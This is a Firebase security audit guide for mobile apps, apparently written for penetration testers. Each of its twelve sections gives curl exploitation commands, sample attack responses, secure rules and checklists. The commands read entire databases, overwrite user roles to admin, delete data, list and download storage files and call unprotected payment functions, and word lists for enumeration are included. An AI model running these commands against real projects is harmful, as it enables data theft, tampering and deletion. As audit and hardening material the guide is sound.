# Firebase Security Vulnerability Patterns

Detailed vulnerability patterns, exploitation techniques, and audit checklists for Firebase implementations in mobile applications.

---

## 1. OPEN EMAIL/PASSWORD SIGNUP (Critical)

**The Problem:** Firebase Authentication allows anyone to create accounts via the Identity Toolkit API, even if the app UI doesn't expose registration.

**Vulnerable Configuration:**
```
Firebase Console → Authentication → Sign-in method → Email/Password: Enabled
```

**Exploitation:**
```bash
# Create arbitrary account via API
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","password":"Password123!","returnSecureToken":true}' \
  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
```

**Successful Attack Response:**
```json
{
  "idToken": "eyJhbGciOiJSUzI1NiIs...",
  "email": "attacker@evil.com",
  "refreshToken": "AGEhc0C...",
  "expiresIn": "3600",
  "localId": "abc123xyz"
}
```

**Impact:**
- Bypass invite-only systems
- Access authenticated-only resources
- Exhaust authentication quotas
- Potential for account enumeration attacks

**Secure Configuration:**
```
Firebase Console → Authentication → Settings → User Actions:
  ☐ Enable create (sign-up)  ← DISABLE THIS
  ☑ Enable delete

Or use Admin SDK for user creation only:
```
```javascript
// Server-side only user creation
const admin = require('firebase-admin');
admin.auth().createUser({
  email: 'user@example.com',
  password: 'securePassword123'
});
```

**Audit Checklist:**
- [ ] Test `accounts:signUp` endpoint with API key
- [ ] Check if `ADMIN_ONLY_OPERATION` error is returned
- [ ] Verify user creation is restricted to admin SDK
- [ ] Review if app legitimately needs public signup

---

## 2. ANONYMOUS AUTHENTICATION ENABLED (High)

**The Problem:** Anonymous auth creates real Firebase users with valid tokens, bypassing `auth != null` security rules.

**Vulnerable Configuration:**
```
Firebase Console → Authentication → Sign-in method → Anonymous: Enabled
```

**Exploitation:**
```bash
# Get anonymous auth token
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"returnSecureToken":true}' \
  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaXXXXXX"
```

**Successful Attack Response:**
```json
{
  "idToken": "eyJhbGciOiJSUzI1NiIs...",
  "refreshToken": "AGEhc0B...",
  "expiresIn": "3600",
  "localId": "anon_user_id_123"
}
```

**Bypassing "Authenticated Only" Rules:**
```javascript
// These rules are BYPASSED by anonymous auth
{
  "rules": {
    ".read": "auth != null",  // Anonymous user passes this!
    ".write": "auth != null"
  }
}
```

**Attack with Token:**
```bash
# Access "authenticated" resources with anonymous token
curl "https://PROJECT.firebaseio.com/users.json?auth=eyJhbGciOiJSUzI1NiIs..."
```

**Secure Rules (Require Real Users):**
```javascript
{
  "rules": {
    ".read": "auth != null && auth.token.email_verified == true",
    ".write": "auth != null && auth.provider !== 'anonymous'"
  }
}
```

**Audit Checklist:**
- [ ] Test anonymous signup endpoint
- [ ] If token returned, test database/storage access with it
- [ ] Check if security rules distinguish anonymous vs real users
- [ ] Verify business need for anonymous authentication

---

## 3. EMAIL ENUMERATION (Medium)

**The Problem:** The `createAuthUri` endpoint reveals whether an email is registered.

**Vulnerable Response:**
```bash
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"identifier":"victim@company.com","continueUri":"https://localhost"}' \
  "https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=AIzaXXXXXX"
```

**Information Disclosure Response:**
```json
{
  "kind": "identitytoolkit#CreateAuthUriResponse",
  "registered": true,  // LEAKS registration status
  "sessionId": "...",
  "signinMethods": ["password"]  // LEAKS auth methods
}
```

**Impact:**
- User enumeration for targeted attacks
- Credential stuffing reconnaissance
- Social engineering intelligence

**Secure Configuration:**
```
Firebase Console → Authentication → Settings → User enumeration protection: Enabled
```

**Audit Checklist:**
- [ ] Test `createAuthUri` with known and unknown emails
- [ ] Check if `registered` field varies between existing/non-existing users
- [ ] Verify email enumeration protection is enabled

---

## 4. REALTIME DATABASE UNAUTHENTICATED READ (Critical)

**The Problem:** Database rules allow public read access to all data.

**Vulnerable Rules:**
```json
{
  "rules": {
    ".read": true,
    ".write": false
  }
}
```

**Exploitation:**
```bash
# Read entire database
curl "https://PROJECT-ID.firebaseio.com/.json"

# Read with shallow query (shows structure even if full read denied)
curl "https://PROJECT-ID.firebaseio.com/.json?shallow=true"

# Read specific paths
curl "https://PROJECT-ID.firebaseio.com/users.json"
curl "https://PROJECT-ID.firebaseio.com/messages.json"
curl "https://PROJECT-ID.firebaseio.com/orders.json"
```

**Data Exposure Response:**
```json
{
  "users": {
    "user123": {
      "email": "john@example.com",
      "phone": "+1234567890",
      "address": "123 Main St"
    }
  },
  "api_keys": {
    "stripe": "sk_live_XXXX",
    "twilio": "ACXXXX"
  }
}
```

**Secure Rules:**
```json
{
  "rules": {
    ".read": false,
    ".write": false,
    "users": {
      "$uid": {
        ".read": "$uid === auth.uid",
        ".write": "$uid === auth.uid"
      }
    },
    "public": {
      ".read": true,
      ".write": false
    }
  }
}
```

**Audit Checklist:**
- [ ] Test root read: `/.json`
- [ ] Test shallow query: `/.json?shallow=true`
- [ ] Enumerate common paths: users, messages, orders, config, admin
- [ ] Check for sensitive data exposure (PII, API keys, tokens)

---

## 5. REALTIME DATABASE UNAUTHENTICATED WRITE (Critical)

**The Problem:** Database rules allow public write access, enabling data manipulation or injection.

**Vulnerable Rules:**
```json
{
  "rules": {
    ".read": false,
    ".write": true  // CRITICAL VULNERABILITY
  }
}
```

**Exploitation:**
```bash
# Write arbitrary data
curl -X PUT \
  -H "Content-Type: application/json" \
  -d '{"attacker":"was_here","timestamp":1234567890}' \
  "https://PROJECT-ID.firebaseio.com/pwned.json"

# Overwrite existing data
curl -X PUT \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}' \
  "https://PROJECT-ID.firebaseio.com/users/victim_uid/profile.json"

# Delete data
curl -X DELETE "https://PROJECT-ID.firebaseio.com/important_data.json"
```

**Impact:**
- Data tampering and corruption
- Privilege escalation (modify user roles)
- Inject malicious content
- Delete critical data
- Store illegal content

**Secure Rules:**
```json
{
  "rules": {
    ".write": false,
    "user_content": {
      "$uid": {
        ".write": "$uid === auth.uid",
        ".validate": "newData.hasChildren(['title', 'body']) && newData.child('title').isString()"
      }
    }
  }
}
```

**Audit Checklist:**
- [ ] Test write to test path: `/_security_test.json`
- [ ] Attempt to modify existing data paths
- [ ] Check if validation rules exist
- [ ] Clean up any test data written

---

## 6. FIRESTORE OPEN DOCUMENT ACCESS (Critical)

**The Problem:** Firestore security rules allow public access to collections.

**Vulnerable Rules:**
```javascript
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /{document=**} {
      allow read, write: if true;  // OPEN TO EVERYONE
    }
  }
}
```

**Exploitation:**
```bash
# List root collections
curl "https://firestore.googleapis.com/v1/projects/PROJECT-ID/databases/(default)/documents"

# Read specific collection
curl "https://firestore.googleapis.com/v1/projects/PROJECT-ID/databases/(default)/documents/users"

# Read specific document
curl "https://firestore.googleapis.com/v1/projects/PROJECT-ID/databases/(default)/documents/users/admin"
```

**Write Attack:**
```bash
# Create document
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"fields":{"role":{"stringValue":"admin"},"injected":{"booleanValue":true}}}' \
  "https://firestore.googleapis.com/v1/projects/PROJECT-ID/databases/(default)/documents/users"
```

**Common Sensitive Collections to Test:**
```
users, accounts, profiles, members, customers, clients,
orders, transactions, payments, invoices, billing,
messages, chats, conversations, notifications,
settings, config, admin, secrets, tokens, api_keys,
sessions, credentials, passwords, logs, audit
```

**Secure Rules:**
```javascript
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    // Deny all by default
    match /{document=**} {
      allow read, write: if false;
    }

    // User-specific access
    match /users/{userId} {
      allow read, write: if request.auth != null && request.auth.uid == userId;
    }

    // Public read, authenticated write
    match /public/{docId} {
      allow read: if true;
      allow write: if request.auth != null;
    }
  }
}
```

**Audit Checklist:**
- [ ] Test root document listing
- [ ] Enumerate common collection names
- [ ] Test write access to collections
- [ ] Check for PII and sensitive data exposure
- [ ] Verify rules use `request.auth.uid` for user data

---

## 7. FIREBASE STORAGE BUCKET LISTING (High)

**The Problem:** Storage rules allow listing bucket contents, exposing all stored files.

**Vulnerable Rules:**
```javascript
rules_version = '2';
service firebase.storage {
  match /b/{bucket}/o {
    match /{allPaths=**} {
      allow read, write: if true;
    }
  }
}
```

**Exploitation:**
```bash
# List all files in bucket
curl "https://firebasestorage.googleapis.com/v0/b/PROJECT-ID.appspot.com/o"

# Alternative: gs:// format bucket
curl "https://firebasestorage.googleapis.com/v0/b/PROJECT-ID/o"
```

**Exposed Files Response:**
```json
{
  "items": [
    {
      "name": "user_uploads/private_document.pdf",
      "bucket": "project-id.appspot.com",
      "contentType": "application/pdf",
      "size": "1048576",
      "downloadTokens": "abc123"
    },
    {
      "name": "backups/database_dump_2024.sql",
      "bucket": "project-id.appspot.com"
    }
  ]
}
```

**Download Exposed Files:**
```bash
# Download using the file path
curl "https://firebasestorage.googleapis.com/v0/b/PROJECT-ID.appspot.com/o/user_uploads%2Fprivate_document.pdf?alt=media"
```

**Impact:**
- Exposure of user-uploaded content
- Access to backup files
- Private documents, images, videos leaked
- Potential credential/key exposure in uploaded files

**Secure Rules:**
```javascript
rules_version = '2';
service firebase.storage {
  match /b/{bucket}/o {
    // Deny listing by default
    match /{allPaths=**} {
      allow read, write: if false;
    }

    // User-specific folders
    match /users/{userId}/{allPaths=**} {
      allow read, write: if request.auth != null && request.auth.uid == userId;
    }

    // Public assets (no listing)
    match /public/{fileId} {
      allow read: if true;
      allow write: if request.auth != null;
    }
  }
}
```

**Audit Checklist:**
- [ ] Test bucket listing endpoint
- [ ] Check both `.appspot.com` and raw bucket names
- [ ] Look for sensitive file types (sql, pdf, json, env)
- [ ] Attempt to download exposed files
- [ ] Check for backup or admin directories

---

## 8. FIREBASE STORAGE UNAUTHENTICATED UPLOAD (Critical)

**The Problem:** Anyone can upload files to the storage bucket.

**Exploitation:**
```bash
# Upload arbitrary file
curl -X POST \
  -H "Content-Type: text/plain" \
  --data-binary "malicious content here" \
  "https://firebasestorage.googleapis.com/v0/b/PROJECT-ID.appspot.com/o?uploadType=media&name=pwned.txt"
```

**Impact:**
- Storage quota exhaustion (billing attack)
- Malware hosting
- Phishing page hosting
- Illegal content storage (legal liability)
- Overwrite existing files

**Secure Rules with Validation:**
```javascript
rules_version = '2';
service firebase.storage {
  match /b/{bucket}/o {
    match /user_uploads/{userId}/{fileName} {
      allow write: if request.auth != null
                   && request.auth.uid == userId
                   && request.resource.size < 5 * 1024 * 1024  // 5MB limit
                   && request.resource.contentType.matches('image/.*');  // Images only
    }
  }
}
```

**Audit Checklist:**
- [ ] Test file upload to various paths
- [ ] Check if content type restrictions exist
- [ ] Verify file size limits
- [ ] Test overwriting existing files
- [ ] Clean up any uploaded test files

---

## 9. CLOUD FUNCTIONS UNAUTHENTICATED ACCESS (Medium-High)

**The Problem:** HTTP-triggered Cloud Functions accessible without authentication.

**Vulnerable Function:**
```javascript
// No auth check - anyone can call
exports.processPayment = functions.https.onRequest((req, res) => {
  const { userId, amount } = req.body;
  // Process payment without verifying caller
  processPayment(userId, amount);
  res.send({ success: true });
});
```

**Exploitation:**
```bash
# Call unprotected function
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"userId":"victim123","amount":0.01}' \
  "https://us-central1-PROJECT-ID.cloudfunctions.net/processPayment"

# Test callable function
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"data":{}}' \
  "https://us-central1-PROJECT-ID.cloudfunctions.net/adminFunction"
```

**Common Function Names to Enumerate:**
```
login, logout, register, signup, authenticate, verify,
createUser, deleteUser, updateUser, getUser, getUsers,
processPayment, createOrder, sendEmail, sendNotification,
uploadFile, generateToken, validateToken, refreshToken,
getData, setData, syncData, backup, restore, export,
webhook, callback, api, admin, debug, test, healthcheck
```

**Regions to Test:**
```
us-central1, us-east1, us-east4, us-west1,
europe-west1, europe-west2, europe-west3,
asia-east1, asia-east2, asia-northeast1, asia-south1
```

**Secure Function:**
```javascript
exports.processPayment = functions.https.onCall(async (data, context) => {
  // Verify authentication
  if (!context.auth) {
    throw new functions.https.HttpsError('unauthenticated', 'Must be logged in');
  }

  // Verify authorization
  if (context.auth.uid !== data.userId) {
    throw new functions.https.HttpsError('permission-denied', 'Cannot process for other users');
  }

  // Process payment
  return processPayment(context.auth.uid, data.amount);
});
```

**Audit Checklist:**
- [ ] Enumerate function names from APK strings
- [ ] Test each function with GET and POST
- [ ] Check response codes: 404=doesn't exist, 401/403=exists+protected, 200=accessible
- [ ] Test callable functions with `{"data":{}}` payload
- [ ] Try multiple regions

---

## 10. REMOTE CONFIG PUBLIC EXPOSURE (Medium)

**The Problem:** Firebase Remote Config parameters accessible with just the API key.

**Exploitation:**
```bash
curl -H "x-goog-api-key: AIzaXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" \
  "https://firebaseremoteconfig.googleapis.com/v1/projects/PROJECT-ID/remoteConfig"
```

**Exposed Configuration Response:**
```json
{
  "parameters": {
    "api_endpoint": {
      "defaultValue": { "value": "https://internal-api.company.com" }
    },
    "feature_flags": {
      "defaultValue": { "value": "{\"admin_panel\":true,\"debug_mode\":true}" }
    },
    "third_party_keys": {
      "defaultValue": { "value": "sk_live_XXXXXXXX" }
    }
  }
}
```

**Impact:**
- Internal API endpoint discovery
- Feature flag enumeration
- Hardcoded secrets exposure
- Business logic revelation

**Secure Practice:**
```javascript
// Don't store secrets in Remote Config
// Use Secret Manager or server-side configuration

// Set conditions for sensitive parameters
{
  "parameters": {
    "debug_mode": {
      "defaultValue": { "value": "false" },
      "conditionalValues": {
        "internal_testers": { "value": "true" }
      }
    }
  }
}
```

**Audit Checklist:**
- [ ] Test Remote Config endpoint with API key
- [ ] Look for hardcoded secrets in parameters
- [ ] Check for internal URLs or endpoints
- [ ] Review feature flags for security implications

---

## 11. INSECURE SECURITY RULES PATTERNS

**The Problem:** Common mistakes in Firebase security rules that appear secure but aren't.

**Pattern 1: Trusting Client Data**
```javascript
// VULNERABLE - client controls isAdmin field
match /users/{userId} {
  allow write: if request.resource.data.isAdmin == false;
}
// Attack: Set isAdmin=false initially, then update to true
```

**Pattern 2: Missing Validation**
```javascript
// VULNERABLE - no field validation
match /posts/{postId} {
  allow create: if request.auth != null;
}
// Attack: Create posts with arbitrary fields, including admin flags
```

**Pattern 3: Overly Broad Wildcards**
```javascript
// VULNERABLE - matches ANY path
match /{document=**} {
  allow read: if request.auth != null;
}
// Problem: Authenticated users can read ALL data
```

**Pattern 4: Time-Based Rules Without Server Time**
```javascript
// VULNERABLE - client can manipulate timestamp
match /events/{eventId} {
  allow read: if resource.data.publishDate <= request.time;
}
// Attack: Client clock manipulation
```

**Secure Patterns:**
```javascript
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {

    // Function to check admin status from a trusted source
    function isAdmin() {
      return get(/databases/$(database)/documents/admins/$(request.auth.uid)).data.isAdmin == true;
    }

    // Validate all required fields
    function isValidPost() {
      return request.resource.data.keys().hasAll(['title', 'content', 'authorId'])
             && request.resource.data.authorId == request.auth.uid
             && request.resource.data.title is string
             && request.resource.data.title.size() <= 200;
    }

    match /posts/{postId} {
      allow create: if request.auth != null && isValidPost();
      allow update: if request.auth.uid == resource.data.authorId;
      allow delete: if request.auth.uid == resource.data.authorId || isAdmin();
    }
  }
}
```

**Audit Checklist:**
- [ ] Review rules for client-controlled privilege escalation
- [ ] Check for field validation on writes
- [ ] Verify wildcards don't grant excessive access
- [ ] Look for timestamp manipulation vulnerabilities
- [ ] Test boundary conditions in rules

---

## 12. API KEY EXPOSURE AND MISUSE

**The Problem:** Firebase API keys extracted from APKs can be used for various attacks.

**Extraction Locations:**
```
google-services.json          → client[].api_key[].current_key
res/values/strings.xml        → google_api_key, firebase_api_key
assets/*.json                 → apiKey, api_key
Smali code                    → const-string with "AIza"
Raw DEX strings               → strings command output
```

**API Key Format:**
```
AIza[A-Za-z0-9_-]{35}
Example: AIzaSyA1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q
```

**What Attackers Can Do With API Key:**
| API | Risk | Mitigation |
|-----|------|------------|
| Identity Toolkit | Account creation, enumeration | Restrict signup, enable protections |
| Realtime Database | Read/write if rules allow | Proper security rules |
| Firestore | Read/write if rules allow | Proper security rules |
| Storage | Read/write if rules allow | Proper security rules |
| Remote Config | Read config parameters | Don't store secrets |
| Cloud Messaging | Send push notifications | Use server keys server-side only |

**Secure Practices:**
```
Firebase Console → Project Settings → API Keys:
1. Restrict Android key to your app's SHA-1 fingerprint
2. Restrict iOS key to your app's bundle ID
3. Use separate keys for different environments
4. Monitor key usage in Cloud Console
5. Never use server/admin keys in client apps
```

**Audit Checklist:**
- [ ] Extract all API keys from APK
- [ ] Test each key against Firebase APIs
- [ ] Check if keys are properly restricted
- [ ] Look for server keys accidentally included
- [ ] Verify keys aren't reused across projects

---

## Quick Reference: Testing Commands

```bash
# Authentication Tests
curl -X POST -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"Test123!","returnSecureToken":true}' \
  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=API_KEY"

# Anonymous Auth
curl -X POST -H "Content-Type: application/json" \
  -d '{"returnSecureToken":true}' \
  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=API_KEY"

# Realtime Database
curl "https://PROJECT.firebaseio.com/.json"
curl "https://PROJECT.firebaseio.com/.json?shallow=true"

# Firestore
curl "https://firestore.googleapis.com/v1/projects/PROJECT/databases/(default)/documents"

# Storage
curl "https://firebasestorage.googleapis.com/v0/b/PROJECT.appspot.com/o"

# Remote Config
curl -H "x-goog-api-key: API_KEY" \
  "https://firebaseremoteconfig.googleapis.com/v1/projects/PROJECT/remoteConfig"

# Cloud Functions
curl "https://us-central1-PROJECT.cloudfunctions.net/functionName"
```
